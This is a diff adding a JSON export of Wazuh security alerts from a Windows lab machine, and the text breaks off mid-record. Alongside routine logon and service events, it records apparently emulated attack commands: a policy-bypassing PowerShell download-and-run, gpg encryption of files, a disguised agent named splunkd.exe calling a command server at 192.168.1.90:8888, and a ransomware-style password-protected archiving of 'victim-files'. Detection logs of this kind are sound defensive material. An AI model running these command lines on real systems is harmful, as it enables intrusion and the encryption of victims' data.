@@ -1,0 +1,3907 @@
+[ 
+ {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "YEfdOZkBIDwfn7_zzKqj",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "subjectLogonId": "0x3e7",
+            "subjectDomainName": "WORKGROUP",
+            "targetLinkedLogonId": "0x0",
+            "impersonationLevel": "%%1833",
+            "authenticationPackageName": "Negotiate",
+            "targetLogonId": "0x3e7",
+            "logonProcessName": "Advapi",
+            "logonGuid": "{00000000-0000-0000-0000-000000000000}",
+            "targetUserName": "SYSTEM",
+            "keyLength": "0",
+            "elevatedToken": "%%1842",
+            "subjectUserSid": "S-1-5-18",
+            "processId": "0x2dc",
+            "processName": "C:\\\\Windows\\\\System32\\\\services.exe",
+            "targetDomainName": "NT AUTHORITY",
+            "targetUserSid": "S-1-5-18",
+            "virtualAccount": "%%1843",
+            "logonType": "5",
+            "subjectUserName": "DESKTOP-MDNNEJF$"
+          },
+          "system": {
+            "eventID": "4624",
+            "keywords": "0x8020000000000000",
+            "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+            "level": "0",
+            "channel": "Security",
+            "opcode": "0",
+            "message": "\"L'ouverture de session d'un compte s'est correctement déroulée.\r\n\r\nObjet :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tDESKTOP-MDNNEJF$\r\n\tDomaine du compte :\t\tWORKGROUP\r\n\tID d'ouverture de session :\t\t0x3E7\r\n\r\nInformations d'ouverture de session :\r\n\tType d'ouverture de session :\t\t5\r\n\tMode administrateur restreint :\t-\r\n\tCredential Guard à distance :\t-\r\n\tCompte virtuel :\t\tNon\r\n\tJeton élevé :\t\tOui\r\n\r\nNiveau d'emprunt d'identité :\t\tEmprunt d’identité\r\n\r\nNouvelle ouverture de session :\r\n\tID de sécurité :\t\tS-1-5-18\r\n\tNom du compte :\t\tSYSTEM\r\n\tDomaine du compte :\t\tNT AUTHORITY\r\n\tID d'ouverture de session :\t\t0x3E7\r\n\tID d'ouverture de session liée :\t\t0x0\r\n\tNom du compte réseau :\t-\r\n\tDomaine du compte réseau :\t-\r\n\tGUID d'ouverture de session :\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nInformations sur le processus :\r\n\tID du processus :\t\t0x2dc\r\n\tNom du processus :\t\tC:\\Windows\\System32\\services.exe\r\n\r\nInformations sur le réseau :\r\n\tNom de la station de travail :\t-\r\n\tAdresse du réseau source :\t-\r\n\tPort source :\t\t-\r\n\r\nInformations détaillées sur l'authentification :\r\n\tProcessus d'ouverture de session :\t\tAdvapi  \r\n\tPackage d'authentification :\tNegotiate\r\n\tServices en transit :\t-\r\n\tNom du package (NTLM uniquement) :\t-\r\n\tLongueur de la clé :\t\t0\r\n\r\nCet événement est généré lors de la création d'une ouverture de session. Il est généré sur l'ordinateur sur lequel l'ouverture de session a été effectuée.\r\n\r\nLe champ Objet indique le compte sur le système local qui a demandé l'ouverture de session. Il s'agit le plus souvent d'un service, comme le service Serveur, ou un processus local tel que Winlogon.exe ou Services.exe.\r\n\r\nLe champ Type d'ouverture de session indique le type d'ouverture de session qui s'est produit. Les types les plus courants sont 2 (interactif) et 3 (réseau).\r\n\r\nLe champ Nouvelle ouverture de session indique le compte pour lequel la nouvelle ouverture de session a été créée, par exemple, le compte qui s'est connecté.\r\n\r\nLes champs relatifs au réseau indiquent la provenance d'une demande d'ouverture de session à distance. Le nom de la station de travail n'étant pas toujours disponible, peut être laissé vide dans certains cas.\r\n\r\nLe champ du niveau d'emprunt d'identité indique la portée de l'emprunt d'identité que peut prendre un processus dans la session d'ouverture de session.\r\n\r\nLes champs relatifs aux informations d'authentification fournissent des détails sur cette demande d'ouverture de session spécifique.\r\n\t- Le GUID d'ouverture de session est un identificateur unique pouvant servir à associer cet événement à un événement KDC .\r\n\t- Les services en transit indiquent les services intermédiaires qui ont participé à cette demande d'ouverture de session.\r\n\t- Nom du package indique quel est le sous-protocole qui a été utilisé parmi les protocoles NTLM.\r\n\t- La longueur de la clé indique la longueur de la clé de session générée. Elle a la valeur 0 si aucune clé de session n'a été demandée.\"",
+            "version": "3",
+            "systemTime": "2025-09-11T17:40:52.7326338Z",
+            "eventRecordID": "19804",
+            "threadID": "804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "12544",
+            "processID": "756",
+            "severityValue": "AUDIT_SUCCESS",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          }
+        }
+      },
+      "rule": {
+        "mail": false,
+        "level": 3,
+        "pci_dss": [
+          "10.2.5"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Windows Logon Success",
+        "groups": [
+          "windows",
+          "windows_security",
+          "authentication_success"
+        ],
+        "nist_800_53": [
+          "AU.14",
+          "AC.9"
+        ],
+        "gdpr": [
+          "IV_32.2"
+        ],
+        "firedtimes": 7,
+        "mitre": {
+          "technique": [
+            "Valid Accounts"
+          ],
+          "id": [
+            "T1078"
+          ],
+          "tactic": [
+            "Defense Evasion",
+            "Persistence",
+            "Privilege Escalation",
+            "Initial Access"
+          ]
+        },
+        "id": "60106",
+        "gpg13": [
+          "7.1",
+          "7.2"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612453.1671822",
+      "timestamp": "2025-09-11T17:40:53.108+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:40:53.108Z"
+      ]
+    },
+    "sort": [
+      1757612453108
+    ]
+  },
+
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "XEfYOZkBIDwfn7_zl6pB",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "Cmd.Exe",
+            "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
+            "description": "Windows Command Processor",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \\\"if (test-path 'C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe') { ; } else {Set-Content -Path \\\\\\\"$env:temp\\\\test.txt\\\\\\\" -Value \\\\\\\"populating this file with some text\\\\\\\"; New-Item -Type Directory \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\\\\\\\\\\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \\\\\\\"https://files.gpg4win.org/gpg4win-4.1.0.exe\\\\\\\" -outfile \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe\\\\\\\"; cmd /c \\\\\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe\\\\\\\" /S};  ;  Set-Content -Path \\\\\\\"$env:temp\\\\test.txt\\\\\\\" -Value \\\\\\\"populating this file with some text\\\\\\\"; cmd /c \\\\\\\"`\\\\\\\"C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe`\\\\\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\\\\\\\"$env:temp\\\\test.txt`\\\\\\\"\\\\\\\"\\\"",
+            "processGuid": "{994437b3-0855-68c3-c027-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "1404",
+            "processId": "3032",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:35:17.633",
+            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c \\\"\\\"C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c \\\"C:\\\\Users\\\\ENV-AD~1\\\\AppData\\\\Local\\\\Temp\\\\test.txt\\\"\\\"",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:35:17.633\r\nProcessGuid: {994437b3-0855-68c3-c027-000000000e00}\r\nProcessId: 3032\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.22621.608 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c \"\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe\" --passphrase 'SomeParaphraseBlah' --batch --yes -c \"C:\\Users\\ENV-AD~1\\AppData\\Local\\Temp\\test.txt\"\"\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964\r\nParentProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nParentProcessId: 1404\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"if (test-path 'C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe') { ; } else {Set-Content -Path \\\"$env:temp\\test.txt\\\" -Value \\\"populating this file with some text\\\"; New-Item -Type Directory \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\\\\\\" -ErrorAction Ignore -Force | Out-Null; invoke-webrequest \\\"https://files.gpg4win.org/gpg4win-4.1.0.exe\\\" -outfile \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\"; cmd /c \\\"PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe\\\" /S};  ;  Set-Content -Path \\\"$env:temp\\test.txt\\\" -Value \\\"populating this file with some text\\\"; cmd /c \\\"`\\\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\\\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\\\"$env:temp\\test.txt`\\\"\\\"\"\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:35:17.6360477Z",
+            "eventRecordID": "9949",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 4,
+        "mail": false,
+        "level": 4,
+        "description": "Powershell process spawned Windows command shell instance",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Windows Command Shell"
+          ],
+          "id": [
+            "T1059.003"
+          ],
+          "tactic": [
+            "Execution"
+          ]
+        },
+        "id": "92004"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612118.1653432",
+      "timestamp": "2025-09-11T17:35:18.227+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:35:18.227Z"
+      ]
+    },
+    "sort": [
+      1757612118227
+    ]
+  },
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "gkfvOZkBIDwfn7_zFKos",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "param3": "Démarrage automatique",
+            "param4": "BITS",
+            "param1": "Service de transfert intelligent en arrière-plan",
+            "param2": "Démarrage à la demande"
+          },
+          "system": {
+            "eventID": "7040",
+            "eventSourceName": "Service Control Manager",
+            "keywords": "0x8080000000000000",
+            "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
+            "level": "4",
+            "channel": "System",
+            "opcode": "0",
+            "message": "\"Le type de démarrage du service Service de transfert intelligent en arrière-plan est passé de Démarrage à la demande à Démarrage automatique.\"",
+            "version": "0",
+            "systemTime": "2025-09-11T17:59:50.5521426Z",
+            "eventRecordID": "15080",
+            "threadID": "10928",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "0",
+            "processID": "732",
+            "severityValue": "INFORMATION",
+            "providerName": "Service Control Manager"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 3,
+        "mail": false,
+        "level": 3,
+        "pci_dss": [
+          "10.6"
+        ],
+        "hipaa": [
+          "164.312.b"
+        ],
+        "tsc": [
+          "CC6.1",
+          "CC6.8",
+          "CC7.2",
+          "CC7.3"
+        ],
+        "description": "Service startup type was changed",
+        "groups": [
+          "windows",
+          "windows_system",
+          "policy_changed"
+        ],
+        "id": "61104",
+        "nist_800_53": [
+          "AU.6"
+        ],
+        "info": "This does not appear to be logged on Windows 2000",
+        "gdpr": [
+          "IV_35.7.d"
+        ]
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757613591.1821187",
+      "timestamp": "2025-09-11T17:59:51.587+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:59:51.587Z"
+      ]
+    },
+    "sort": [
+      1757613591587
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "gEfvOZkBIDwfn7_zCKpx",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "data": "2025-09-12T15:50:43Z, RulesEngine"
+          },
+          "system": {
+            "eventID": "16384",
+            "eventSourceName": "Software Protection Platform Service",
+            "keywords": "0x80000000000000",
+            "providerGuid": "{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}",
+            "level": "4",
+            "channel": "Application",
+            "opcode": "0",
+            "message": "\"La planification du redémarrage du service de protection logicielle à 2025-09-12T15:50:43Z a réussi. Raison : RulesEngine.\"",
+            "version": "0",
+            "systemTime": "2025-09-11T17:59:43.2729111Z",
+            "eventRecordID": "7256",
+            "threadID": "0",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "0",
+            "processID": "8456",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Security-SPP"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 3,
+        "description": "Software protection service scheduled successfully.",
+        "groups": [
+          "windows",
+          "windows_application"
+        ],
+        "id": "60642"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757613583.1810657",
+      "timestamp": "2025-09-11T17:59:43.301+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:59:43.301Z"
+      ]
+    },
+    "sort": [
+      1757613583301
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "W0fYOZkBIDwfn7_zl6pB",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\ExternalPayloads\\\\gpginstall.exe",
+            "product": "Gpg4win (4.1.0)",
+            "parentProcessGuid": "{994437b3-0855-68c3-be27-000000000e00}",
+            "description": "Gpg4win: The GNU Privacy Guard and Tools for Windows",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe /S",
+            "processGuid": "{994437b3-0855-68c3-bf27-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "10348",
+            "processId": "7196",
+            "currentDirectory": "C:\\\\Windows\\\\System32\\\\",
+            "utcTime": "2025-09-11 17:35:17.169",
+            "hashes": "MD5=AF7406E869659C6A02D9281B0E2B9260,SHA256=E0FDDC840808EEF9531F14A515F8B3B6C46511977F00569161129C1DEE413B38,IMPHASH=EB0806DAE800674E97000F10E2EC3AA2",
+            "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "company": "Intevation GmbH",
+            "commandLine": "PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\gpginstall.exe  /S",
+            "integrityLevel": "High",
+            "fileVersion": "4.1.0.59752",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"Process Create:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:35:17.169\r\nProcessGuid: {994437b3-0855-68c3-bf27-000000000e00}\r\nProcessId: 7196\r\nImage: C:\\Windows\\System32\\ExternalPayloads\\gpginstall.exe\r\nFileVersion: 4.1.0.59752\r\nDescription: Gpg4win: The GNU Privacy Guard and Tools for Windows\r\nProduct: Gpg4win (4.1.0)\r\nCompany: Intevation GmbH\r\nOriginalFileName: -\r\nCommandLine: PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe  /S\r\nCurrentDirectory: C:\\Windows\\System32\\\r\nUser: DESKTOP-MDNNEJF\\env-admin\r\nLogonGuid: {994437b3-7451-68b8-95e0-070000000000}\r\nLogonId: 0x7E095\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: MD5=AF7406E869659C6A02D9281B0E2B9260,SHA256=E0FDDC840808EEF9531F14A515F8B3B6C46511977F00569161129C1DEE413B38,IMPHASH=EB0806DAE800674E97000F10E2EC3AA2\r\nParentProcessGuid: {994437b3-0855-68c3-be27-000000000e00}\r\nParentProcessId: 10348\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c PathToAtomicsFolder\\..\\ExternalPayloads\\gpginstall.exe /S\r\nParentUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "5",
+            "systemTime": "2025-09-11T17:35:17.3773971Z",
+            "eventRecordID": "9948",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "1",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 15,
+        "mail": false,
+        "level": 3,
+        "description": "Suspicious Windows cmd shell execution",
+        "groups": [
+          "sysmon",
+          "sysmon_eid1_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Account Discovery",
+            "Windows Command Shell"
+          ],
+          "id": [
+            "T1087",
+            "T1059.003"
+          ],
+          "tactic": [
+            "Discovery",
+            "Execution"
+          ]
+        },
+        "id": "92032"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612118.1647649",
+      "timestamp": "2025-09-11T17:35:18.221+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:35:18.221Z"
+      ]
+    },
+    "sort": [
+      1757612118221
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "V0fYOZkBIDwfn7_zDqpr",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "processGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
+            "processId": "1404",
+            "utcTime": "2025-09-11 17:34:40.461",
+            "targetFilename": "C:\\\\Windows\\\\System32\\\\ExternalPayloads\\\\gpginstall.exe",
+            "ruleName": "EXE",
+            "creationUtcTime": "2025-09-11 17:34:40.461",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: EXE\r\nUtcTime: 2025-09-11 17:34:40.461\r\nProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Windows\\System32\\ExternalPayloads\\gpginstall.exe\r\nCreationUtcTime: 2025-09-11 17:34:40.461\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:34:40.4649159Z",
+            "eventRecordID": "9944",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 1,
+        "mail": false,
+        "level": 9,
+        "description": "Powershell process created an executable file in Windows root folder",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "92205"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612081.1635793",
+      "timestamp": "2025-09-11T17:34:41.511+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:34:41.511Z"
+      ]
+    },
+    "sort": [
+      1757612081511
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "VkfYOZkBIDwfn7_zDqpr",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "processGuid": "{994437b3-082f-68c3-bd27-000000000e00}",
+            "processId": "1404",
+            "utcTime": "2025-09-11 17:34:39.197",
+            "targetFilename": "C:\\\\Users\\\\env-admin\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest_a2rusfem.lly.ps1",
+            "creationUtcTime": "2025-09-11 17:34:39.197",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "11",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
+            "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-09-11 17:34:39.197\r\nProcessGuid: {994437b3-082f-68c3-bd27-000000000e00}\r\nProcessId: 1404\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetFilename: C:\\Users\\env-admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_a2rusfem.lly.ps1\r\nCreationUtcTime: 2025-09-11 17:34:39.197\r\nUser: DESKTOP-MDNNEJF\\env-admin\"",
+            "version": "2",
+            "systemTime": "2025-09-11T17:34:39.2097865Z",
+            "eventRecordID": "9943",
+            "threadID": "4804",
+            "computer": "DESKTOP-MDNNEJF",
+            "task": "11",
+            "processID": "3544",
+            "severityValue": "INFORMATION",
+            "providerName": "Microsoft-Windows-Sysmon"
+          }
+        }
+      },
+      "rule": {
+        "firedtimes": 41,
+        "mail": true,
+        "level": 15,
+        "description": "Executable file dropped in folder commonly used by malware",
+        "groups": [
+          "sysmon",
+          "sysmon_eid11_detections",
+          "windows"
+        ],
+        "mitre": {
+          "technique": [
+            "Ingress Tool Transfer"
+          ],
+          "id": [
+            "T1105"
+          ],
+          "tactic": [
+            "Command and Control"
+          ]
+        },
+        "id": "92213"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+      },
+      "id": "1757612080.1632975",
+      "timestamp": "2025-09-11T17:34:40.176+0000"
+    },
+    "fields": {
+      "timestamp": [
+        "2025-09-11T17:34:40.176Z"
+      ]
+    },
+    "sort": [
+      1757612080176
+    ]
+  },
+
+
+  {
+    "_index": "wazuh-alerts-4.x-2025.09.11",
+    "_id": "VUfXOZkBIDwfn7_zX6pa",
+    "_score": null,
+    "_source": {
+      "input": {
+        "type": "log"
+      },
+      "agent": {
+        "ip": "192.168.1.101",
+        "name": "DESKTOP-MDNNEJF",
+        "id": "001"
+      },
+      "manager": {
+        "name": "ubuntu22"
+      },
+      "data": {
+        "win": {
+          "eventdata": {
+            "originalFileName": "Cmd.Exe",
+            "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+            "product": "Microsoft® Windows® Operating System",
+            "parentProcessGuid": "{994437b3-f6cf-68c2-1627-000000000e00}",
+            "description": "Windows Command Processor",
+            "logonGuid": "{994437b3-7451-68b8-95e0-070000000000}",
+            "parentCommandLine": "\\\"C:\\\\Users\\\\Public\\\\splunkd.exe\\\" -server http://192.168.1.90:8888 -group red",
+            "processGuid": "{994437b3-0800-68c3-bc27-000000000e00}",
+            "logonId": "0x7e095",
+            "parentProcessId": "10580",
+            "processId": "10384",
+            "currentDirectory": "C:\\\\Windows\\\\system32\\\\",
+            "utcTime": "2025-09-11 17:33:52.617",
+            "hashes": "MD5=791545E6E3C5EB61DD12CCFBAE1B9982,SHA256=B7EDC54E6B42CA1CDA290CE8CACFECAAC6DBCC8C14631BC20FB184A6309C1824,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+            "parentImage": "C:\\\\Users\\\\Public\\\\splunkd.exe",
+            "company": "Microsoft Corporation",
+            "commandLine": "cmd.exe /C path=%%path%%;\\\"C:\\\\Program Files (x86)\\\\winzip\\\" &amp;&amp; mkdir .\\\\tmp\\\\victim-files &amp;&amp; cd .\\\\tmp\\\\victim-files &amp;&amp; echo \\\"This file will be encrypted\\\" &gt; .\\\\encrypted_file.txt &amp;&amp; \\\"%%ProgramFiles%%\\\\WinZip\\\\winzip64.exe\\\" -min -a -s\\\"hello\\\" archive.zip * &amp;&amp; dir",
+            "integrityLevel": "High",
+            "fileVersion": "10.0.22621.608 (WinBuild.160101.0800)",
+            "user": "DESKTOP-MDNNEJF\\\\env-admin",
+            "terminalSessionId": "1",
+            "parentUser": "DESKTOP-MDNNEJF\\\\env-admin"
+          },
+          "system": {
+            "eventID": "1",
+            "keywords": "0x8000000000000000",
+            "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+            "level": "4",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "opcode": "0",
